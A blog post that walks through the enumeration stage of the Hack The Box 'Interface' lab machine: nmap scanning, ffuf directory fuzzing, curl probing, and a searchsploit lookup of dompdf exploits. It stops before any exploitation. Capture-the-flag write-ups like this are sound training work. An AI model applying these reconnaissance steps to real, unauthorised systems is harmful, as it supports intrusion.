<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>Interface | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Interface" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="http://localhost:4000/interface/" /><meta property="og:url" content="http://localhost:4000/interface/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/interface/Interface.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-13T14:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/interface/Interface.png" /><meta property="twitter:title" content="Interface" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"url":"http://localhost:4000/interface/","headline":"Interface","dateModified":"2023-05-13T14:49:38+03:00","datePublished":"2023-05-13T14:49:38+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/interface/"},"author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","image":"http://localhost:4000/assets/img/interface/Interface.png","description":"This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>Interface | Gemstone-Hashghost</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Interface" /><meta name="author" content="Julius Soraely" /><meta property="og:locale" content="en_US" /><meta name="description" content="This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><meta property="og:description" content="This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel" /><link rel="canonical" href="http://localhost:4000/interface/" /><meta property="og:url" content="http://localhost:4000/interface/" /><meta property="og:site_name" content="Gemstone-Hashghost" /><meta property="og:image" content="http://localhost:4000/assets/img/interface/Interface.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-05-13T14:49:38+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/interface/Interface.png" /><meta property="twitter:title" content="Interface" /><meta name="twitter:site" content="@hashghost21" /><meta name="twitter:creator" content="@Julius Soraely" /><meta name="google-site-verification" content="CtBtIysuQ8b6k36FI7jqU-o34DRoA_sye50a-RNtPPY" /> <script type="application/ld+json"> {"url":"http://localhost:4000/interface/","headline":"Interface","dateModified":"2023-05-13T14:49:38+03:00","datePublished":"2023-05-13T14:49:38+03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/interface/"},"author":{"@type":"Person","name":"Julius Soraely"},"@type":"BlogPosting","image":"http://localhost:4000/assets/img/interface/Interface.png","description":"This is Hacktheboxmedium Linux machine implemented in NestJS technology with api. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection. Enumeration Nmap Scan 1 2 ┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface] └─$ nmap -sC -sV -oN nmap-scan 10.10.11.200 Result ``` Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT Nmap scan report for 10.10.11.200 Host is up (0.44s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 7289a0957eceaea8596b2d2dbc90b55a (RSA) | 256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA) |_ 256 cc62905560a658629e6b80105c799b55 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site Maintenance Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Gemstone-Hashghost</a></div><div class="site-subtitle font-italic">Computer Networks | InfoSec Engineer</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/gemstone-source" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/hashghost21" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['sophiajulius5','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.com/home/users/profile/990235" target="_blank"> <i class="fas fa-cube"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Interface</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Interface</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, May 13, 2023, 2:49 PM +0300" > May 13 <i class="unloaded">2023-05-13T14:49:38+03:00</i> </span> by <span class="author"> Julius Soraely </span></div></div><div class="post-content"> <img src="/assets/img/interface/Interface.png" class="post-preview-img"><p>This is <a href="https://app.hackthebox.com/machines/527">Hackthebox</a>medium Linux machine implemented in <code class="language-plaintext highlighter-rouge">NestJS</code> technology with <code class="language-plaintext highlighter-rouge">api</code>. This box requires much of enumeration with proper payloads and wordlists in order to get the proper responses. I will enumerate to get file upload for user and i will exploit root user through arithmetic injection.</p><h2 id="enumeration">Enumeration</h2><h3 id="nmap-scan">Nmap Scan</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ nmap -sC -sV -oN nmap-scan  10.10.11.200 
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 12:03 EAT
Nmap scan report for 10.10.11.200
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 127.40 second
</pre></table></code></div></div><p>Seems only two ports are open which are <code class="language-plaintext highlighter-rouge">22</code> for <code class="language-plaintext highlighter-rouge">ssh</code> and <code class="language-plaintext highlighter-rouge">80</code> for web service. Lets try to access the web page.</p><h3 id="web-enumeration">Web Enumeration.</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/01.png" alt="image" /></p><p>Seems the the site is under maintenance. At this step i decided to fuzz for some directories but found nothing.</p><h3 id="request-and-response-headers">Request and Response Headers</h3><p>It is important to check what headers have been used in testing web application because by doing so it will be easy to know the technology used(Not all the time) and you can find interesting details.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/02.png" alt="image" /></p><p>In response header <code class="language-plaintext highlighter-rouge">Content-Securiy-Policy</code> has some urls and one of them is <code class="language-plaintext highlighter-rouge">http://prd.m.rendering-api.interface.htb</code> then i will add this to <code class="language-plaintext highlighter-rouge">/etc/hosts</code><br /> Then after adding now it will can be resolved easily</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/interface/03.png" alt="image" /></p><p>The site returns that message meaning the file am trying to access is not find then i can enumerate more by fuzzing both subdomains and some directories</p><h3 id="enumerate-enumerate-enumerate">Enumerate Enumerate Enumerate</h3><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0   
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

api                     [Status: 404, Size: 50, Words: 3, Lines: 1]
vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2]
                        [Status: 404, Size: 16, Words: 3, Lines: 2]

</pre></table></code></div></div><p>There is <code class="language-plaintext highlighter-rouge">api</code> and <code class="language-plaintext highlighter-rouge">vendor</code> directory then i can try to access them.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:07:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

File not found.
</pre></table></code></div></div><p>The same message continue, meaning more fuzzing is needed here but i can enumerate more in <code class="language-plaintext highlighter-rouge">vendor</code>, Then lets continue to enumerate this directory.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ ffuf -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -mc all -ic -c -fs 0
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://prd.m.rendering-api.interface.htb/vendor/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________

                        [Status: 404, Size: 16, Words: 3, Lines: 2]
dompdf                  [Status: 403, Size: 15, Words: 2, Lines: 2]
composer                [Status: 403, Size: 15, Words: 2, Lines: 2]
:: Progress: [30000/30000] :: Job [1/1] :: 410 req/sec :: Duration: [0:01:13] :: Errors: 2 ::
</pre></table></code></div></div><p>The fuzzing provided two new directories which are <code class="language-plaintext highlighter-rouge">composer</code> and <code class="language-plaintext highlighter-rouge">dompdf</code> all these directories i can try to access them to see how they will respond as follows:-</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/composer
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:37:29 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Access denied.
</pre></table></code></div></div><p>Composer returned status code <code class="language-plaintext highlighter-rouge">403</code> with <code class="language-plaintext highlighter-rouge">Access denied</code> message</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf  
HTTP/1.1 403 Forbidden
Server: nginx/1.14.0 (Ubuntu)
Date: Thu, 30 Mar 2023 10:39:59 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

Access denied.
</pre></table></code></div></div><p>Also <code class="language-plaintext highlighter-rouge">dompdf</code> does the same but after some searching i found that <a href="https://www.codexworld.com/convert-html-to-pdf-php-dompdf/">Dompdf</a> is a PHP library that provides a simple way to convert HTML to PDF documents. Since it is open source then it can be vulnerable at some points.</p><p>Searching with <code class="language-plaintext highlighter-rouge">searchsploit</code> resulted the followings.</p><p><strong>Command</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(gemstone㉿hashghost)-[~/C7F5/htb/Machines/interface]
└─$ searchsploit dompdf 
</pre></table></code></div></div><p><strong>Result</strong></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>----------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                |  Path
----------------------------------------------------------------------------------------------------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                          | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion                                                    | php/webapps/14851.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                             | php/webapps/35443.txt
----------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
